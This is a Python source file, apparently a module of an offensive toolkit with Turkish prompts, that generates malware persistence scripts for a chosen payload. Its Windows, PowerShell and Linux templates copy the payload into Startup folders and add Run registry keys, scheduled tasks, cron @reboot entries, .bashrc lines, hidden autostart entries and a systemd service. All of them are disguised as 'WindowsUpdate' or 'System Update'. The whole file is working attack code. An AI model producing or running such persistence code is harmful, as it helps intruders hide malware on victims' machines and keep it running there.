import os
import time
import platform
from rich.console import Console
from rich.panel import Panel

console = Console()


def gen_windows_persistence(payload_path):
    return f'''import winreg
import shutil
import os

payload = r"{payload_path}"
startup_path = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
dest = os.path.join(startup_path, os.path.basename(payload))
shutil.copy2(payload, dest)

key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, payload)
winreg.CloseKey(key)

task_cmd = f'schtasks /create /tn "WindowsUpdate" /tr "{{payload}}" /sc onlogon /rl highest /f'
os.system(task_cmd)

print("Persistence kuruldu.")
'''


def gen_linux_persistence(payload_path):
    return f'''#!/bin/bash
PAYLOAD="{payload_path}"

mkdir -p ~/.config/autostart
cat > ~/.config/autostart/update.desktop << EOF
[Desktop Entry]
Type=Application
Name=System Update
Exec=$PAYLOAD
Hidden=true
NoDisplay=true
EOF

(crontab -l 2>/dev/null; echo "@reboot $PAYLOAD") | crontab -

echo "$PAYLOAD &" >> ~/.bashrc

if [ -d /etc/systemd/system ]; then
    cat > /tmp/update.service << EOFS
[Unit]
Description=System Update Service
After=network.target

[Service]
ExecStart=$PAYLOAD
Restart=always

[Install]
WantedBy=multi-user.target
EOFS
    sudo cp /tmp/update.service /etc/systemd/system/
    sudo systemctl enable update.service
fi

echo "Persistence kuruldu."
'''


def gen_ps_persistence(payload_path):
    return f'''$payload = "{payload_path}"

$startup = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\\Windows\\Start Menu\\Programs\\Startup", [System.IO.Path]::GetFileName($payload))
Copy-Item $payload $startup -Force

New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsUpdate" -Value $payload -PropertyType String -Force

$action = New-ScheduledTaskAction -Execute $payload
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Force

Write-Host "Persistence kuruldu."
'''


def run():
    console.print()
    console.print(f"  [bold purple]🌙 PERSISTENCE GENERATOR[/bold purple]")
    console.print(f"  [dim #4a2c8a]{'─' * 50}[/dim #4a2c8a]")
    console.print(f"   [#a78bfa][1][/#a78bfa] Windows (Python)")
    console.print(f"   [#a78bfa][2][/#a78bfa] Windows (PowerShell)")
    console.print(f"   [#a78bfa][3][/#a78bfa] Linux (Bash)")
    console.print(f"   [#a78bfa][0][/#a78bfa] Geri don")
    console.print(f"  [dim #4a2c8a]{'─' * 50}[/dim #4a2c8a]")

    choice = console.input("\n[bold white]  Secim: [/bold white]").strip()

    if choice == "0":
        return

    payload_path = console.input("[bold white]  Payload dosya yolu: [/bold white]").strip()
    if not payload_path:
        console.print("[red]  Dosya yolu gerekli.[/red]")
        return

    if choice == "1":
        code = gen_windows_persistence(payload_path)
        fname = f"persist_win_{int(time.time())}.py"
    elif choice == "2":
        code = gen_ps_persistence(payload_path)
        fname = f"persist_win_{int(time.time())}.ps1"
    elif choice == "3":
        code = gen_linux_persistence(payload_path)
        fname = f"persist_linux_{int(time.time())}.sh"
    else:
        console.print("[red]  Gecersiz secim.[/red]")
        return

    console.print(Panel(code, title="🌕 Persistence Script", border_style="purple", padding=(1, 2)))

    save = console.input("[bold white]  Dosyaya kaydet? (e/h): [/bold white]").strip().lower()
    if save == "e":
        with open(fname, "w") as f:
            f.write(code)
        console.print(f"[#a78bfa]  Kaydedildi: {os.path.abspath(fname)}[/#a78bfa]")
